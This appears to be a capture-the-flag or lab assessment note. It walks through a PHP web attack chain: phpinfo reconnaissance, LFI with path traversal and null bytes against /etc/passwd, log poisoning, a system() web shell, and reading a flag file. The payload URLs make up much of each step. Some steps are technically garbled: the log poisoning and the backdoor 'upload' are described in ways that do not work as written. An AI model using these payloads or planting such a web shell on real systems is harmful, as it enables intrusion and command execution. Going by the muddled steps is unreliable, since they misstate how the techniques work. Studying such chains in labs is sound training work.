# 🧑‍💻 Skills Assessment - Multi-technique chain: PHP filters → Hidden admin → LFI → Log poisoning → RCE → Flag extraction

---

> [!ABSTRACT] Overview of the multi-technique attack chain.
>
> This assessment focuses on a series of techniques used to exploit vulnerabilities in web applications, leading to Remote Code Execution (RCE) and flag extraction. The sequence includes identifying PHP filter usage, locating a hidden admin interface, leveraging Local File Inclusion (LFI), poisoning application logs, and ultimately achieving RCE.

---

## 🌐 Initial Reconnaissance

### Identify PHP Filter Usage
> [!NOTE] Identifying the use of PHP filters.
>
> A PHP configuration setting may expose paths for filtering. This is used to identify potential vulnerabilities within the PHP setup.

```text
phpinfo.php
```

If `phpinfo.php` does not exist, look for other files where phpinfo might be outputted or try common file names such as `index.php`, `default.php`.

---

## 🌐 Locating Hidden Admin Interface

### Identify Hidden Admin Interface
> [!NOTE] Looking for hidden admin interfaces.
>
> A web application may have a hidden administration panel, often located outside the default directory structure.

```text
/admin.php?cmd=list
```

If this URL does not work, try variations such as `admin/index.php`, `webadmin.php`.

---

## 🌐 Leveraging Local File Inclusion (LFI)

### Utilize LFI to Include Files
> [!SUCCESS] Successfully exploiting a file inclusion vulnerability.
>
> By manipulating input parameters, you can read arbitrary files on the server.

```text
http://example.com/index.php?page=../../../../etc/passwd%00
```

This example includes `../../../../etc/passwd` and appends `%00` to terminate the request early if null byte injection is supported. Check for other possible file paths like `phpinfo`, `config`.

---

## 🌐 Poisoning Application Logs

### Insert Malicious Code into Log Files
> [!WARNING] Injecting malicious code via log poisoning.
>
> When an application writes user input to logs, this can be exploited by injecting PHP code.

```text
http://example.com/index.php?page=../../../../logs/error.log%00&cmd=<?php phpinfo();?>
```

Ensure that the path is correct and `error.log` is writable. The goal is to include or execute a malicious file upon reading the log file later in another attack phase.

---

## 🌐 Achieving Remote Code Execution (RCE)

### Execute Arbitrary Commands
> [!SUCCESS] Successful execution of arbitrary commands.
>
> Once LFI or other techniques allow reading and writing critical files, RCE can be achieved through a crafted request that writes executable PHP code to a file included by the application.

```text
http://example.com/index.php?page=../../../../var/www/html/backdoor.php%00&cmd=<?php system($_GET['cmd']);?>
```

Upload a backdoor script with a handler like `system` or `shell_exec`. Ensure that the server includes this backdoor file when requested.
   
---

## 🌐 Extracting Flags

### Retrieve Flag from Server
> [!SUCCESS] Retrieving flag successfully after RCE.

```text
http://example.com/backdoor.php?cmd=cat /var/www/html/flag.txt
```

This command reads the contents of `flag.txt` or a similar file, where flags are often stored. Use your crafted backdoor to run commands directly on the server.

---

> [!ATTENTION] Documenting all steps carefully is crucial for understanding and replicating this attack chain in future assessments.
>
> Each phase builds upon previous stages, leading from initial reconnaissance through to RCE and flag extraction.